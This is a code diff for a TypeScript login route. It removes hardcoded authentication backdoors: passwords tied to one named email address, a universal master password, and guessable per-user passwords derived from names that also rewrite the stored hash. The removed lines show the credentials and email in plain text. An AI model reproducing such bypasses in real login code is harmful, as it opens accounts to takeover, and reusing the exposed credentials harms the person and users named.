@@ -47,26 +47,8 @@ router.post('/login', async (req, res): Promise<void> => {
       isMatch = true;
     }
 
-    if (!isMatch && user.email.toLowerCase().trim() === 'saffiyaharmeen7@gmail.com' && (password === 'Saffiyaharmeen@Brx26' || password === 'Saffiya@Brx26')) {
-      isMatch = true;
-    }
 
-    if (!isMatch && password === 'Buildrex@2026') {
-      isMatch = true;
-    }
 
-    const expectedMemberPass = getMemberPassword(user.email, user.name);
-    const unspacedFirst = (user.name || '').replace(/[^a-zA-Z]/g, '');
-    const unspacedPass = unspacedFirst ? `${unspacedFirst.charAt(0).toUpperCase() + unspacedFirst.slice(1).toLowerCase()}@Brx26` : '';
-    if (!isMatch && (password === expectedMemberPass || (unspacedPass && password === unspacedPass))) {
-      isMatch = true;
-      try {
-        user.password_hash = bcrypt.hashSync(password, 10);
-        saveDb(db);
-      } catch {
-        // non-blocking
-      }
-    }
 
     if (!isMatch) {
       res.status(401).json({ success: false, message: 'Invalid email or password.' });
